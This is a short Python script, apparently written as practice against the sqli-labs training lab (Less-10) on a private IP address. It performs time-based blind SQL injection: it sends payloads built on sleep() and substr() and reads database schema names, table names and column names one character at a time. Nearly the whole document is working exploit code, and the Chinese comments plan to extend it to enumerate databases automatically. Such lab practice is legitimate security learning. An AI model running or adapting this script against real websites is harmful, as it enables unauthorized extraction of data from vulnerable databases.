# -*- coding: utf-8 -*-
__author__ = 'K0ctr'

import requests
import time
import binascii

"""
改进：
i的取值可以达到数据库最大值
自动找出多个数据库、表、列（可以设定一个数字），而不是只能找数据库或表或列
"""
url = "http://192.168.203.128/sqli/Less-10/?id=1"
database = "select schema_name from information_schema.schemata"
table = "select table_name from information_schema.tables where table_schema=database()"
# table_name需要指定，最好用十六进制
column = "select column_name from information_schema.columns where table_name=0x%s" \
         % (str(binascii.b2a_hex('users'.encode(encoding="ascii")))[2:-1])

result = ""
print(column)
# i应该是MySQL数据库名、表、列的最大长度
for i in range(1, 30):
    for j in range(48, 122):
        # 只能获取第一条记录
        payload = '" and if(ascii(substr(({} limit 0,1),{},1))={},sleep(2),1) -- + '.format(column, i, j)
        stime = time.time()
        r = requests.get(url + payload)
        etime = time.time()
        if etime - stime >= 2:
            result += chr(j)
            print(result)
            break
# print(result)
